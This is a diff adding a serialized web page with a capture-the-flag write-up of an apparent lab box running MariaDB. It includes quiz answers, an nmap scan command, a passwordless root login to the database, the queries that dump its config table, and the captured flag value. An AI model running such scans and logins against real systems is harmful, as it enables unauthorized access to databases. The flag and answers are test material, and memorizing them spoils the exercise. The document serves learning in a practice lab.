@@ -1,0 +1,90 @@
+I"�<p>Jorge Marco Arráez</p>
+
+<h3 id="1--what-does-the-acronym-sql-stand-for"><a href="#header-3"></a>1.  What does the acronym SQL stand for?</h3>
+
+<p>Structured Query Language</p>
+
+<h3 id="2---during-our-scan-which-port-running-mysql-do-we-find"><a href="#header-3"></a>2.   During our scan, which port running mysql do we find?</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -A -sCV -vv -T4 -n -oN nmap/ports $IP
+</code></pre></div></div>
+
+<p>3306</p>
+
+<h3 id="3--what-community-developed-mysql-version-is-the-target-running"><a href="#header-3"></a>3.  What community-developed MySQL version is the target running?</h3>
+
+<p>MariaDB</p>
+
+<h3 id="4--what-switch-do-we-need-to-use-in-order-to-specify-a-login-username-for-the-mysql-service"><a href="#header-3"></a>4.  What switch do we need to use in order to specify a login username for the MySQL service?</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-u
+</code></pre></div></div>
+<h3 id="5--which-username-allows-us-to-log-into-mariadb-without-providing-a-password"><a href="#header-3"></a>5.  Which username allows us to log into MariaDB without providing a password?</h3>
+
+<p>root</p>
+
+<h3 id="6--what-symbol-can-we-use-to-specify-within-the-query-that-we-want-to-display-eveything-inside-a-table"><a href="#header-3"></a>6.  What symbol can we use to specify within the query that we want to display eveything inside a table?</h3>
+
+<p>‘*’</p>
+
+<h3 id="7---what-symbol-do-we-need-to-end-each-query-with"><a href="#header-3"></a>7.   What symbol do we need to end each query with?</h3>
+
+<p>’;’</p>
+
+<h3 id="8--submit-root-flag"><a href="#header-3"></a>8.  Submit root flag</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql --host $IP -P 3306 -u root
+SHOW DATABASES;
+use htb;
+SHOW TABLES;
+SHOW FIELDS FROM config;
+SELECT * from config;
+</code></pre></div></div>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">id</th>
+      <th style="text-align: left">name</th>
+      <th style="text-align: left">value</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">1</td>
+      <td style="text-align: left">timeout</td>
+      <td style="text-align: left">60s</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">2</td>
+      <td style="text-align: left">security</td>
+      <td style="text-align: left">default</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">3</td>
+      <td style="text-align: left">auto_logon</td>
+      <td style="text-align: left">false</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">4</td>
+      <td style="text-align: left">max_size</td>
+      <td style="text-align: left">2M</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">5</td>
+      <td style="text-align: left">flag</td>
+      <td style="text-align: left">(flag_value)</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">6</td>
+      <td style="text-align: left">enable_uploads</td>
+      <td style="text-align: left">false</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">7</td>
+      <td style="text-align: left">authentication_methods</td>
+      <td style="text-align: left">radius</td>
+    </tr>
+  </tbody>
+</table>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>7b4bec00d1a39e3dd4e021ec3d915da8
+</code></pre></div></div>
+:ET
